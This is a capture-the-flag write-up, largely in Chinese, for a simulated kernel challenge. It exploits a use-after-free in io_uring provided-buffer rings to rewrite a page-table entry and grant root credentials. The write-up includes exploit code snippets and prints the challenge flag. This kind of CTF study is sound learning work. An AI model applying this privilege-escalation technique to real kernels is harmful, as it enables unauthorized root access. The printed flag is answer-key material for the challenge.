# StaleMate Writeup

## 題目描述

The kernel made its move already, you are now in the Stalemate position so can you turn the tide???

Server: `nc pwn.v1t.site 31337`

Backup server: `nc chall.v1t.site 31337`

## 解題思路

1. **第一步**：

    題目 menu：

    ```text
    1. IORING_REGISTER_PBUF_RING
    2. mmap pbuf ring
    3. IORING_UNREGISTER_PBUF_RING
    4. io_uring_buf_ring_add
    5. inspect mapped ring entry
    6. create mm context
    7. vm alloc user page
    8. vm read
    9. vm write
    10. open flag
    ```

    目標流程是透過模擬的 memory management 功能修改 credential，讓 open flag 通過權限檢查並讀出 flag。

2. **第二步**：

    先 UAF，記憶體分配長這樣：

    ```text
    PFN 1 : cred page
    PFN 2 : 一開始的 pbuf ring page
    PFN 3 : scratch page
    ```

    所以可以用下面的方式達成 UAF:

    ```python
    register_pbuf(0, 256, 1)
    mmap_pbuf(0)
    ...
    unregister_pbuf(0)
    ...
    create_mm()
    ```

    這樣 PF2 就會被釋放，被拿去當成 vm 0 的 page table，但因為 map 0 還指向 PFN 2，所以我們可以透過舊 pbuf mapping 去修改 vm 0 的 page table。

3. **第三步**：

    建立 mm context 後，可以用 inspect mapped ring entry (menu 5.) 從 stale mapping 讀 page table。

    exploit 讀的是 map entry 3：

    ```python
    _, scratch_pte = inspect(0, 3)
    ```

    pbuf ring entry 一個 entry 佔 16 bytes：

    ```c
    struct io_uring_buf {
        __u64 addr;
        __u32 len;
        __u16 bid;
        __u16 resv;
    };
    ```

    所以一個 entry 可以被看成兩個 qword：

    ```text
    entry.addr                 -> low qword
    entry.len/bid/resv         -> high qword
    ```

    而 map entry 3 對應 page table 的：

    ```text
    entry 3 low qword  = PTE[6]
    entry 3 high qword = PTE[7]
    ```

    其中 PTE[7] 是 scratch page 的 PTE，也就是 PFN 3 的 encrypted PTE。

    exploit 會把 `len`、`bid`、`resv` 組回一個 64-bit qword：

    ```python
    high_qword = length | (bid << 32) | (resv << 48)
    ```

    這個 high qword 就是 scratch page 的 encrypted PTE。

    然後我們需要將 scratch PTE 改成 cred PTE，題目中的 PTE 不是單純明文，而是有做簡單混淆，但我們不需要知道完整 key，只需要做 PFN 差分。

    scratch PTE 原本指向 PFN 3 ，目標是讓它改指向 PFN 1。

    PTE 的 PFN 位於 bit 12 之後，所以只需要 XOR：

    ```python
    cred_pte = scratch_pte ^ ((3 ^ 1) << 12)
    ```

    這樣就能得到一個指向 cred page 的 encrypted PTE。

4. **第四步**：

    接著用 io_uring_buf_ring_add (menu 4.) 透過 stale map 寫入 page table。

    map entry 0 會覆寫 page table 的前兩個 PTE：

    ```text
    entry 0 addr                 -> PTE[0]
    entry 0 len/bid/resv         -> PTE[1]
    ```

    把 PTE[0] 和 PTE[1] 都設成 cred_pte：

    ```python
    buf_ring_add(
        0,
        0,
        cred_pte,
        cred_pte & 0xffffffff,
        (cred_pte >> 32) & 0xffff,
        (cred_pte >> 48) & 0xffff,
    )
    ```

    vm 0 的 0x0 會映射到 PFN 1，也就是 cred page。

    最後修改 credential，從逆向與 exploit 測試可以整理出 cred 結構：

    ```text
    0x00  "CREDv1"
    0x08  uid / gid 相關欄位
    0x10  uid / gid 相關欄位
    0x18  capability 欄位
    0x20  checksum / hash
    ```

    我們不從 0x0 開始寫，避免破壞 magic `CREDv1`，所以從 0x8 開始寫：

    ```python
    root_cred = b"\x00" * 16 + b"\xff" * 8
    vm_write(0, 8, root_cred)
    ```

    結果會是：

    ```text
    +0x08 ~ +0x17 : 清成 0，相當於 uid/gid = 0
    +0x18 ~ +0x1f : 設成 0xffffffffffffffff，相當於開滿 capability
    ```

    checksum / hash 不動，因此可以通過題目的 credential 檢查。

    最後選擇：

    ```python
    choose(10)
    ```

    即可呼叫 open flag。

## Flag

```text
v1t{pfnmap_pbuf_pages_should_outlive_the_mmap}
```
